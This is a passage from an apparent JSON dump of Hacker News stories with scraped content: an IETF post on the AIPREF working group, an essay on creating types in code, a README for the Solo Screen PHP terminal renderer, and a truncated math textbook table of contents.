Jun 27, 2010 at 17:51\n\n                        Add a comment\n                    |\n\n                                        Start asking to get answers\n                                        Find the answer to your question by asking.\n                                        Ask question\n\n                                        Explore related questions\n                                        booksbig-list\n                                        See similar questions with these tags.\n\n                            Featured on Meta\n\n                Experimenting with a new experiment opt-out option\n\n                Community Asks Sprint Announcement - March 2025\n\n                How might Chat evolve? Help us identify problems and opportunities\n\n            Related\n\n                            86\n\n                        Books about history of recent mathematics\n\n                            14\n\n                        Suggestions for mathematics encyclopedia\n\n                            22\n\n                        What classification theorems have been improved by re-categorizing?\n\n                            91\n\n                        Old books still used\n\n                            22\n\n                        Papers better than books?\n\n                            58\n\n                        What are examples of books which teach the practice of mathematics?\n\n                            15\n\n                        Learning mathematics in an \"independent and idiosyncratic\" way\n\n                            5\n\n                        Springer GTM Series statement of purpose (early editions)\n\n                 $(function() {\n                     $(\".js-gps-related-questions .spacer\").on(\"click\", function () {\n                        fireRelatedEvent($(this).index() + 1, $(this).data('question-id'));\n                     });\n\n                 function fireRelatedEvent(position, questionId) {\n                     StackExchange.using(\"gps\", function() {\n                         StackExchange.gps.track('related_questions.click',\n                         {\n                             position: position,\n                             originQuestionId: 29710,\n                             relatedQuestionId: +questionId,\n                             location: 'sidebar',\n                             source: 'Baseline'\n                         });\n                     });\n                 }\n             });\n\nStackExchange.ready(function(){$.get('/posts/29710/ivc/65d1?prg=e04ebcaf-c700-4d8f-8906-f712e678dd15');});\n<div><img src=\"/posts/29710/ivc/65d1?prg=e04ebcaf-c700-4d8f-8906-f712e678dd15\" class=\"dno\" alt=\"\" width=\"0\" height=\"0\"></div>\n\n{\"doMarkObsolete\":false,\"doTimeOnPage\":false,\"sendAnswerEditorEventsToAEH\":false,\"sendAnswerEditorEventsToPrizm\":false,\"questionId\":29710,\"sendAuthQuestionVisitToAEH\":false,\"sendAuthQuestionVisitToPrizm\":false}",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ba85cdd2931b74b2",
    "title": {
      "en": "IETF setting standards for AI preferences",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.ietf.org/blog/aipref-wg/",
    "score": 30,
    "by": "Mithriil",
    "time": 1742650221,
    "content": "The IETF meeting network is taking steps towards a bigger Internet\n                The “ietf-ipv6-mostly” WiFi SSID at IETF 122 Bangkok will allow devices to signal a preference for IPv6-only operation while still supporting IPv4 (if needed) via translation mechanisms. Onsite participants are encouraged to try this service when they connect to the IETF meeting network.\n\n                    Sean Croghan\n\n                IETF Meeting Network Operations Center Lead\n\n                14 Mar 2025\n\n                A Sustainable Internet: How to get there from here?\n                After a successful side meeting during the IETF 121 Dublin meeting, the new Sustainability and the Internet (SUSTAIN) Proposed Research Group will have its first meeting during IETF 122 Bangkok. You might be wondering, what is this Research Group about?\n\n                    Ali Rezaki\n\n                SUSTAIN Research Group Co-chair\n\n                    Eve Schooler\n\n                SUSTAIN Research Group Co-chair\n\n                    Michael Welzl\n\n                SUSTAIN Research Group Co-chair\n\n                5 Mar 2025\n\n                IETF email service issues resolved as of 4 March 2025\n                The IETF email processing system delays reported on 3 March 2025 have been resolved. All messages in the queue were delivered by 0700 UTC on 4 March and the system is now keeping up.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                4 Mar 2025\n\n                Suggested IETF 122 Sessions for Getting Familiar with New Topics\n                These IETF 122 meeting sessions are likely to include discussions and proposals that are accessible to a broad range of Internet technologists whether they are new to the IETF or long-time participants.\n\n                21 Feb 2025\n\n                IETF email service transition completed on 24 February\n                The IETF email processing infrastructure transition planned for 0900-1100 UTC on 24 February has been completed.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                14 Feb 2025\n\n                Show all\n\n                IETF News\n\n                            Blog listing\n\n                The IETF meeting network is taking steps towards a bigger Internet\n                The “ietf-ipv6-mostly” WiFi SSID at IETF 122 Bangkok will allow devices to signal a preference for IPv6-only operation while still supporting IPv4 (if needed) via translation mechanisms. Onsite participants are encouraged to try this service when they connect to the IETF meeting network.\n\n                    Sean Croghan\n\n                IETF Meeting Network Operations Center Lead\n\n                14 Mar 2025\n\n                A Sustainable Internet: How to get there from here?\n                After a successful side meeting during the IETF 121 Dublin meeting, the new Sustainability and the Internet (SUSTAIN) Proposed Research Group will have its first meeting during IETF 122 Bangkok. You might be wondering, what is this Research Group about?\n\n                    Ali Rezaki\n\n                SUSTAIN Research Group Co-chair\n\n                    Eve Schooler\n\n                SUSTAIN Research Group Co-chair\n\n                    Michael Welzl\n\n                SUSTAIN Research Group Co-chair\n\n                5 Mar 2025\n\n                IETF email service issues resolved as of 4 March 2025\n                The IETF email processing system delays reported on 3 March 2025 have been resolved. All messages in the queue were delivered by 0700 UTC on 4 March and the system is now keeping up.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                4 Mar 2025\n\n                Suggested IETF 122 Sessions for Getting Familiar with New Topics\n                These IETF 122 meeting sessions are likely to include discussions and proposals that are accessible to a broad range of Internet technologists whether they are new to the IETF or long-time participants.\n\n                21 Feb 2025\n\n                IETF email service transition completed on 24 February\n                The IETF email processing infrastructure transition planned for 0900-1100 UTC on 24 February has been completed.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                14 Feb 2025\n\n                Show all\n\n    Show filters\n\n    Filter by topic and date\n\n        Topic\n\n            All\n\n                    General Area\n\n                    Transport Area (tsv)\n\n                    Operations and Management Area\n\n                    Internet Architecture Board\n\n                    News\n\n                    Internet of Things\n\n                    Security & Privacy\n\n                    IRTF\n\n                    Applications and Real-Time Area\n\n                    IETF-LLC\n\n                    Security Area (sec)\n\n        Date from\n\n        Date to\n\n    Filter\n\nFilter by topic and date\n\n        Topic\n\n            All\n\n                    General Area\n\n                    Transport Area (tsv)\n\n                    Operations and Management Area\n\n                    Internet Architecture Board\n\n                    News\n\n                    Internet of Things\n\n                    Security & Privacy\n\n                    IRTF\n\n                    Applications and Real-Time Area\n\n                    IETF-LLC\n\n                    Security Area (sec)\n\n        Date from\n\n        Date to\n\n                Filter\n\n                        IETF setting standards for AI preferences\n\n                    Suresh Krishnan\n\n                AIPREF Working Group Co-chair\n\n                    Mark Nottingham\n\n                AIPREF Working Group Co-chair\n\n                        27 Feb 2025\n                        The newly-chartered AI Preferences (AIPREF) Working Group will work on standardizing building blocks that allow for the expression of preferences about how content is collected and processed for Artificial Intelligence (AI) model development, deployment, and use.\n\nThe use of Internet content for training large language models (\"AI\") has become a contentious topic. Training a model requires voluminous information, and the Internet is readily available as a source of diverse content. However, many publishers and authors object to these new uses of their work without permission or compensation.While the IETF doesn't take a position on the legal questions in this space, we do track developments, and last September the IAB AI-CONTROL Workshop highlighted a need for clearer communication between content publishers and AI model trainers.Right now, AI vendors use a confusing array of non-standard signals in the robots.txt file (defined by RFC 9309) and elsewhere to guide their crawling and training decisions. As a result, authors and publishers lose confidence that their preferences will be adhered to, and resort to measures like blocking their IP addresses.To address this need, the AIPREF working group has been chartered to define:a common vocabulary to express authors' and publishers' preferences regarding use of their content for AI training and related tasks, andmeans of attaching that vocabulary to content on the Internet, either by embedding it in the content or by formats similar to robots.txt, and a standard mechanism to reconcile multiple expressions of preferences.The Working Group will hold its first meeting during IETF 122 Bangkok, where administrative and initial scoping discussions will take place. Shortly thereafter, it will hold an interim meeting from 8-10 April in Brussels, Belgium. This is an open meeting, but registration is required.If you are interested in monitoring or participating in this work, subscribe to the AIPREF working group mailing list.\n\n    Share this page\n\n                                    PreviousSuggested IETF 122 Sessions for Getting Familiar with New Topics\n\n                                    NextIETF email service issues resolved as of 4 March 2025\n\n                The IETF meeting network is taking steps towards a bigger Internet\n                The “ietf-ipv6-mostly” WiFi SSID at IETF 122 Bangkok will allow devices to signal a preference for IPv6-only operation while still supporting IPv4 (if needed) via translation mechanisms. Onsite participants are encouraged to try this service when they connect to the IETF meeting network.\n\n                    Sean Croghan\n\n                IETF Meeting Network Operations Center Lead\n\n                14 Mar 2025\n\n                A Sustainable Internet: How to get there from here?\n                After a successful side meeting during the IETF 121 Dublin meeting, the new Sustainability and the Internet (SUSTAIN) Proposed Research Group will have its first meeting during IETF 122 Bangkok. You might be wondering, what is this Research Group about?\n\n                    Ali Rezaki\n\n                SUSTAIN Research Group Co-chair\n\n                    Eve Schooler\n\n                SUSTAIN Research Group Co-chair\n\n                    Michael Welzl\n\n                SUSTAIN Research Group Co-chair\n\n                5 Mar 2025\n\n                IETF email service issues resolved as of 4 March 2025\n                The IETF email processing system delays reported on 3 March 2025 have been resolved. All messages in the queue were delivered by 0700 UTC on 4 March and the system is now keeping up.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                4 Mar 2025\n\n                Suggested IETF 122 Sessions for Getting Familiar with New Topics\n                These IETF 122 meeting sessions are likely to include discussions and proposals that are accessible to a broad range of Internet technologists whether they are new to the IETF or long-time participants.\n\n                21 Feb 2025\n\n                IETF email service transition completed on 24 February\n                The IETF email processing infrastructure transition planned for 0900-1100 UTC on 24 February has been completed.\n\n                    Robert Sparks\n\n                Senior Director of Information Technology\n\n                14 Feb 2025\n\n                Show all",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "cf48a834519f255b",
    "title": {
      "en": "Don't Be Afraid of Types",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://lmika.org/2025/03/18/dont-be-afraid-of-types.html",
    "score": 108,
    "by": "speckx",
    "time": 1742323980,
    "content": "I found that there’s a slight aversion to creating new types in the codebases I work in. I saw it during my early days while I was working in Java projects, and I see it today in the occasional Go project. Function bodies with lots of local variables, functions that take a large number of arguments or returning a large number of results, extensions to existing types rather than making new ones. It’s a strange phenomenon.\nI can’t explain why this is. Maybe it’s a fear of feeling like you’re tampering with the “grand design” of the codebase. This is plausible as it was the feeling I had as a junior dev. Afraid to create new classes in Java thinking that I’m introducing a new concept to the project that others had to deal with going forward. _I can add all the verbs I want, but who am _ I to introduce a new noun?\nThis is obviously a ridiculous notion when you think about it for more than a few seconds. If you come up with a concept or a series of values that naturally go together, so much so that you’re carrying them together as a series of arguments through multiple function calls, it’s probably in your interested to make a type for it. That’s what the type system is for: a means of grouping similar bits of information into an easy-to-use whole.\nThis makes total sense for the application models: the entities to which you’re software’s reason for being hinges on. But I’ve found it useful to make types for the lesser bits of information: requests from handlers passed through to the service layer, for instance. Just now, I’m working on some code that deals with creating subscriptions. I need to carry the office ID, customer ID, price ID, the subscription quantity, the tax settings, and the subscription metadata from the API handler all the way through to the Stripe client. This is less than what the subscription model deals with, but it’s still a pain to carry these six bits of information separately through the unmarshalling logic, the validation logic, and then through to the server.\nSo what did I do? I made a “CreateSubscriptionRequest” struct, a new type. Yes, it’s not going to be reusable, but who cares? It makes the code and my life simpler. And honestly, I think the whole “object-orientated approach” to software design really screwed up our thinking here. There was this feeling in the zeitgeist that types and classes are sacred, and that to create a new one is a privilege bestowed only to the leads, architects, and anyone else that had write access to the UML diagrams. Each type was to be an artefact of design, probably because of how much baggage came from defining a new one: they had to be in a separate file, must have seven different constructors, and the fields must be mediated through the use of getters and setters. And if you need something similar to what you’re working on, you didn’t “copy-and-paste” like some animal; you inherited or composed what was there. Given all this, it’s probably understandable that creating new types felt like a decision with a significant bit of “weight”; and who are you, mere lowly junior developer, to make such a decision to create a type just to make it easier to handle data from your handler?\nI think the culture around C and Go have got it right. Need to carry a few things for a single function? Create a new type. Don’t worry that it’s used only for a single function. Don’t worry that it only contains a subset of fields of the model you’re operating on.1\nNow obviously it’s possible to go too far, and start having way too many types than is necessary. Don’t forget that a new type is a bit more cognitive load, as the person maintaining you application will now need to unpack and reference your type when they need to work on it. Just stick with what you need, and make it clear what the purpose of the type is. “CreateSubscriptionRequest” makes it plan that this type only deals with the areas of a code that creates subscriptions, and will probably only make sense through those code paths.\nBut take it from someone that’s had do deal with codes passing through and returning several values of strings, ints, and bools through a series of function calls: a single struct value is much easier to work with. All it takes is the courage for someone to say “yes, that should be a type.”\nDon’t be afraid for that someone to be you.\n\nIn fact, that might actually better than using the model type and adding “this field is ignored, that field must be zero, etc. etc.” in the function docs.↩︎",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "22d55cc5566c84c7",
    "title": {
      "en": "Show HN: A terminal emulator in pure PHP",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/soloterm/screen",
    "score": 182,
    "by": "aarondf",
    "time": 1742579005,
    "content": "Solo Screen\nScreen is a terminal renderer written in pure PHP. It powers Solo for Laravel and\ncan be used to build rich text-based user interfaces in any PHP application.\nNoteScreen is a library intended to be integrated into PHP applications. It is not a standalone terminal application.\n\nAbout terminal renderers\nA terminal renderer processes text and ANSI escape sequences to create a virtual representation of terminal output.\nUnlike a full terminal emulator, Screen focuses specifically on correctly interpreting and rendering text content with\nformatting rather than handling input, interactive sessions, or process management.\nTerminal renderers interpret escape sequences to:\n\nTrack cursor position\nApply text colors and styles (bold, underline, etc.)\nManage screen content\nHandle special character sets\nGenerate a final rendered output\n\nScreen implements this functionality in pure PHP, allowing developers to build terminal user interfaces without relying\non external dependencies or native code.\nWhy this exists\nScreen was originally created to solve a specific problem in Solo for Laravel.\nSolo provides a TUI (Text User Interface) that runs multiple processes simultaneously in separate panels, similar to\ntmux. However, when these processes output ANSI escape codes for cursor movement and screen manipulation, they could\npotentially \"break out\" of their visual containers and interfere with other parts of the interface.\nTo solve this problem, Screen creates a virtual terminal buffer where:\n\nAll ANSI operations (cursor movements, color changes, screen clears) are safely interpreted within an isolated\nenvironment\nThe final rendered state is captured after all operations are processed\nOnly the final visual output is displayed to the user's terminal\n\nThis approach provides complete control over how terminal output is rendered, ensuring that complex ANSI operations stay\ncontained within their designated areas. While initially built for Solo, Screen has evolved into a standalone library\nthat can be used in any PHP application requiring terminal rendering.\nFeatures\n\nPure PHP Implementation: Only one dependency (Grapheme, another Solo\nlibrary)\nComprehensive ANSI Support: Handles cursor positioning, text styling, and screen manipulation\nUnicode/Multibyte Support: Properly handles UTF-8 characters including emojis and wide characters\nBuffer Management: Maintains separate buffers for text content and styling\nCharacter Width Handling: Correctly calculates display width for CJK and other double-width characters\nScrolling: Support for vertical scrolling with proper content management\n\nInstallation\nInstall via Composer:\ncomposer require soloterm/screen\n\nRequirements\n\nPHP 8.1 or higher\nmbstring extension\n\nBasic usage\nHere's a simple example of using Screen:\nuse SoloTerm\\Screen\\Screen;\n\n// Create a screen with dimensions (columns, rows)\n$screen = new Screen(80, 24);\n\n// Write text and ANSI escape sequences\n$screen->write(\"Hello, \\e[1;32mWorld!\\e[0m\");\n\n// Move cursor and add more text\n$screen->write(\"\\e[5;10HPositioned text\");\n\n// Get the rendered content\necho $screen->output();\n\nCore concepts\nScreen operates with several key components:\nScreen\nThe main class that coordinates all functionality. It takes care of cursor positioning, content writing, and rendering\nthe final output.\n$screen = new Screen(80, 24); // width, height\n$screen->write(\"Text and ANSI codes\");\n\nBuffers\nScreen uses multiple buffer types to track content and styling:\n\nPrintableBuffer: Stores visible characters and handles width calculations\nAnsiBuffer: Tracks styling information (colors, bold, underline, etc.)\n\nANSI processing\nScreen correctly interprets ANSI escape sequences for:\n\nCursor movement (up, down, left, right, absolute positioning)\nText styling (colors, bold, italic, underline)\nScreen clearing and line manipulation\nScrolling\n\nAdvanced features\nCursor positioning\n// Move cursor to position (row 5, column 10)\n$screen->write(\"\\e[5;10H\");\n\n// Move cursor up 3 lines\n$screen->write(\"\\e[3A\");\n\n// Save and restore cursor position\n$screen->write(\"\\e7\"); // Save\n$screen->write(\"More text\");\n$screen->write(\"\\e8\"); // Restore\n\nText styling\n// Bold red text\n$screen->write(\"\\e[1;31mImportant message\\e[0m\");\n\n// Background colors\n$screen->write(\"\\e[44mBlue background\\e[0m\");\n\n// 256-color support\n$screen->write(\"\\e[38;5;208mOrange text\\e[0m\");\n\n// RGB colors\n$screen->write(\"\\e[38;2;255;100;0mCustom color\\e[0m\");\n\nScreen manipulation\n// Clear screen\n$screen->write(\"\\e[2J\");\n\n// Clear from cursor to end of line\n$screen->write(\"\\e[0K\");\n\n// Insert lines\n$screen->write(\"\\e[2L\");\n\n// Scroll up\n$screen->write(\"\\e[2S\");\n\nCustom integrations\nYou can respond to terminal queries by setting a callback:\n$screen->respondToQueriesVia(function($response) {\n    // Process response (like cursor position)\n    echo $response;\n});\n\nNoteThis is still a work in progress. We need some more tests / use cases here.\n\nExample: building a simple UI\nuse SoloTerm\\Screen\\Screen;\n\n$screen = new Screen(80, 24);\n\n// Draw a border\n$screen->write(\"┌\" . str_repeat(\"─\", 78) . \"┐\\n\");\nfor ($i = 0; $i < 22; $i++) {\n    $screen->write(\"│\" . str_repeat(\" \", 78) . \"│\\n\");\n}\n$screen->write(\"└\" . str_repeat(\"─\", 78) . \"┘\");\n\n// Add a title\n$screen->write(\"\\e[1;30H\\e[1;36mMy Application\\e[0m\");\n\n// Add some content\n$screen->write(\"\\e[5;5HWelcome to the application!\");\n$screen->write(\"\\e[7;5HPress 'q' to quit.\");\n\n// Render\necho $screen->output();\n\nHandling unicode and wide characters\nScreen properly handles Unicode characters including emoji and CJK characters that take up multiple columns:\n$screen->write(\"Regular text: Hello\");\n$screen->write(\"\\nWide characters: 你好世界\");\n$screen->write(\"\\nEmoji: 🚀 👨‍👩‍👧‍👦 🌍\");\n\nTesting\nScreen includes a comprehensive testing suite that features a unique visual comparison system:\ncomposer test\n\nVisual testing\nScreen employs an innovative screenshot-based testing approach (see ComparesVisually trait) that validates the visual\noutput:\n\nThe test renders content in a real terminal (iTerm)\nIt captures a screenshot of the terminal output\nIt runs the same content through the Screen renderer\nIt captures a screenshot of the rendered output\nIt compares the screenshots pixel-by-pixel to ensure accuracy\n\nThis testing strategy ensures that Screen's rendering accurately matches real terminal behavior, especially for complex\nscenarios involving:\n\nMulti-byte characters\nComplex ANSI formatting\nCursor movements\nScrolling behavior\nLine wrapping\n\nFor environments without screenshot capabilities, tests can fall back to fixture-based comparison, making the test suite\nversatile for CI/CD pipelines.\nTo enable screenshots for all tests, use the following command:\nENABLE_SCREENSHOT_TESTING=1 composer test\n\nTo enable screenshots for only the tests that don't already have fixtures, use the following command:\nENABLE_SCREENSHOT_TESTING=2 composer test\n\nContributing\nContributions are welcome! Please feel free to submit a pull request.\nLicense\nThe MIT License (MIT).\nSupport\nThis is free! If you want to support me:\n\nSponsor my open source work: aaronfrancis.com/backstage\nCheck out my courses:\n\nMastering Postgres\nHigh Performance SQLite\nScreencasting\n\nHelp spread the word about things I make\n\nCredits\nSolo Screen was developed by Aaron Francis. If you like it, please let me know!\n\nTwitter: https://twitter.com/aarondfrancis\nWebsite: https://aaronfrancis.com\nYouTube: https://youtube.com/@aarondfrancis\nGitHub: https://github.com/aarondfrancis",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "98e60ae8c2214936",
    "title": {
      "en": "Math for Computer Science and Machine Learning [pdf]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.cis.upenn.edu/~jean/math-deep.pdf",
    "score": 51,
    "by": "ibobev",
    "time": 1742636557,
    "content": "Algebra, Topology, Differential Calculus, and Optimization Theory For Computer Science and Machine Learning  Jean Gallier and Jocelyn Quaintance Department of Computer and Information Science University of Pennsylvania Philadelphia, PA 19104, USA e-mail:   jean@seas.upenn.edu  ©   Jean Gallier March 1, 2025\n\n2\n\nContents  Contents   3 1   Introduction   19 2   Groups, Rings, and Fields   21  2.1   Groups, Subgroups, Cosets   . . . . . . . . . . . . . . . . . . . . . . . . . . .   21 2.2   Cyclic Groups   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   35 2.3   Rings and Fields   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   38  I   Linear Algebra   47  3   Vector Spaces, Bases, Linear Maps   49  3.1   Motivations: Linear Combinations, Linear Independence, Rank   . . . . . . .   49 3.2   Vector Spaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   61 3.3   Indexed Families; the Sum Notation   ∑  i ∈ I   a i   . . . . . . . . . . . . . . . . . .   64 3.4   Linear Independence, Subspaces   . . . . . . . . . . . . . . . . . . . . . . . .   70 3.5   Bases of a Vector Space   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   77 3.6   Matrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   84 3.7   Linear Maps   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   91 3.8   Quotient Spaces   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   100 3.9   Linear Forms and the Dual Space . . . . . . . . . . . . . . . . . . . . . . . .   101 3.10   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   105 3.11   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   106  4   Matrices and Linear Maps   115  4.1   Representation of Linear Maps by Matrices   . . . . . . . . . . . . . . . . . .   115 4.2   Composition of Linear Maps and Matrix Multiplication   . . . . . . . . . . .   120 4.3   Change of Basis Matrix   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   126 4.4   The Effect of a Change of Bases on Matrices   . . . . . . . . . . . . . . . . .   131 4.5   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   136 4.6   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   136  5   Haar Bases, Haar Wavelets, Hadamard Matrices   143  3\n\n4   CONTENTS  5.1   Introduction to Signal Compression Using Haar Wavelets   . . . . . . . . . .   143 5.2   Haar Matrices, Scaling Properties of Haar Wavelets . . . . . . . . . . . . . .   145 5.3   Kronecker Product Construction of Haar Matrices   . . . . . . . . . . . . . .   150 5.4   Multiresolution Signal Analysis with Haar Bases   . . . . . . . . . . . . . . .   152 5.5   Haar Transform for Digital Images   . . . . . . . . . . . . . . . . . . . . . . .   155 5.6   Hadamard Matrices   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   161 5.7   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   163 5.8   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   164  6   Direct Sums   169  6.1   Sums, Direct Sums, Direct Products   . . . . . . . . . . . . . . . . . . . . . .   169 6.2   Matrices of Linear Maps and Multiplication by Blocks   . . . . . . . . . . . .   179 6.3   The Rank-Nullity Theorem; Grassmann’s Relation   . . . . . . . . . . . . . .   192 6.4   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   200 6.5   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   200  7   Determinants   209  7.1   Permutations, Signature of a Permutation   . . . . . . . . . . . . . . . . . . .   209 7.2   Alternating Multilinear Maps . . . . . . . . . . . . . . . . . . . . . . . . . .   213 7.3   Definition of a Determinant . . . . . . . . . . . . . . . . . . . . . . . . . . .   217 7.4   Inverse Matrices and Determinants . . . . . . . . . . . . . . . . . . . . . . .   226 7.5   Systems of Linear Equations and Determinants   . . . . . . . . . . . . . . . .   229 7.6   Determinant of a Linear Map . . . . . . . . . . . . . . . . . . . . . . . . . .   231 7.7   The Cayley–Hamilton Theorem . . . . . . . . . . . . . . . . . . . . . . . . .   232 7.8   Permanents . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   237 7.9   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   239 7.10   Further Readings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   241 7.11   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   241  8   Gaussian Elimination, LU, Cholesky, Echelon Form   247  8.1   Motivating Example: Curve Interpolation   . . . . . . . . . . . . . . . . . . .   247 8.2   Gaussian Elimination   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   251 8.3   Elementary Matrices and Row Operations . . . . . . . . . . . . . . . . . . .   256 8.4   LU   -Factorization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   259 8.5   P A   =   LU   Factorization   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   265 8.6   Proof of Theorem 8.5   ~   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   273 8.7   Dealing with Roundoff Errors; Pivoting Strategies . . . . . . . . . . . . . . .   278 8.8   Gaussian Elimination of Tridiagonal Matrices   . . . . . . . . . . . . . . . . .   280 8.9   SPD Matrices and the Cholesky Decomposition . . . . . . . . . . . . . . . .   282 8.10   Reduced Row Echelon Form . . . . . . . . . . . . . . . . . . . . . . . . . . .   291 8.11   RREF, Free Variables, Homogeneous Systems . . . . . . . . . . . . . . . . .   297 8.12   Uniqueness of RREF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   300 8.13   Solving Linear Systems Using RREF . . . . . . . . . . . . . . . . . . . . . .   302\n\nCONTENTS   5 8.14   Elementary Matrices and Columns Operations   . . . . . . . . . . . . . . . .   308 8.15   Transvections and Dilatations   ~   . . . . . . . . . . . . . . . . . . . . . . . .   309 8.16   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   315 8.17   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   316  9   Vector Norms and Matrix Norms   327  9.1   Normed Vector Spaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   327 9.2   Matrix Norms   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   339 9.3   Subordinate Norms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   344 9.4   Inequalities Involving Subordinate Norms   . . . . . . . . . . . . . . . . . . .   351 9.5   Condition Numbers of Matrices . . . . . . . . . . . . . . . . . . . . . . . . .   353 9.6   An Application of Norms: Inconsistent Linear Systems . . . . . . . . . . . .   362 9.7   Limits of Sequences and Series   . . . . . . . . . . . . . . . . . . . . . . . . .   363 9.8   The Matrix Exponential . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   366 9.9   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   369 9.10   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   371  10 Iterative Methods for Solving Linear Systems   377  10.1   Convergence of Sequences of Vectors and Matrices   . . . . . . . . . . . . . .   377 10.2   Convergence of Iterative Methods . . . . . . . . . . . . . . . . . . . . . . . .   380 10.3   Methods of Jacobi, Gauss–Seidel, and Relaxation . . . . . . . . . . . . . . .   382 10.4   Convergence of the Methods . . . . . . . . . . . . . . . . . . . . . . . . . . .   390 10.5   Convergence Methods for Tridiagonal Matrices   . . . . . . . . . . . . . . . .   393 10.6   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   398 10.7   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   399  11 The Dual Space and Duality   403  11.1   The Dual Space   E ∗   and Linear Forms   . . . . . . . . . . . . . . . . . . . . .   403 11.2   Pairing and Duality Between   E   and   E ∗   . . . . . . . . . . . . . . . . . . . .   410 11.3   The Duality Theorem and Some Consequences   . . . . . . . . . . . . . . . .   415 11.4   The Bidual and Canonical Pairings . . . . . . . . . . . . . . . . . . . . . . .   421 11.5   Hyperplanes and Linear Forms   . . . . . . . . . . . . . . . . . . . . . . . . .   423 11.6   Transpose of a Linear Map and of a Matrix   . . . . . . . . . . . . . . . . . .   424 11.7   Properties of the Double Transpose . . . . . . . . . . . . . . . . . . . . . . .   431 11.8   The Four Fundamental Subspaces   . . . . . . . . . . . . . . . . . . . . . . .   433 11.9   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   436 11.10 Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   437  12 Euclidean Spaces   441  12.1   Inner Products, Euclidean Spaces . . . . . . . . . . . . . . . . . . . . . . . .   441 12.2   Orthogonality and Duality in Euclidean Spaces   . . . . . . . . . . . . . . . .   450 12.3   Adjoint of a Linear Map . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   457 12.4   Existence and Construction of Orthonormal Bases   . . . . . . . . . . . . . .   460\n\n6   CONTENTS  12.5   Linear Isometries (Orthogonal Transformations) . . . . . . . . . . . . . . . .   467 12.6   The Orthogonal Group, Orthogonal Matrices   . . . . . . . . . . . . . . . . .   470 12.7   The Rodrigues Formula   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   472 12.8   QR -Decomposition for Invertible Matrices . . . . . . . . . . . . . . . . . . .   475 12.9   Some Applications of Euclidean Geometry . . . . . . . . . . . . . . . . . . .   480 12.10 Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   481 12.11 Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   483  13   QR -Decomposition for Arbitrary Matrices   495  13.1   Orthogonal Reflections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   495 13.2   QR -Decomposition Using Householder Matrices . . . . . . . . . . . . . . . .   500 13.3   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   510 13.4   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   510  14 Hermitian Spaces   517  14.1   Hermitian Spaces, Pre-Hilbert Spaces   . . . . . . . . . . . . . . . . . . . . .   517 14.2   Orthogonality, Duality, Adjoint of a Linear Map   . . . . . . . . . . . . . . .   526 14.3   Linear Isometries (Also Called Unitary Transformations) . . . . . . . . . . .   531 14.4   The Unitary Group, Unitary Matrices   . . . . . . . . . . . . . . . . . . . . .   533 14.5   Hermitian Reflections and   QR -Decomposition . . . . . . . . . . . . . . . . .   536 14.6   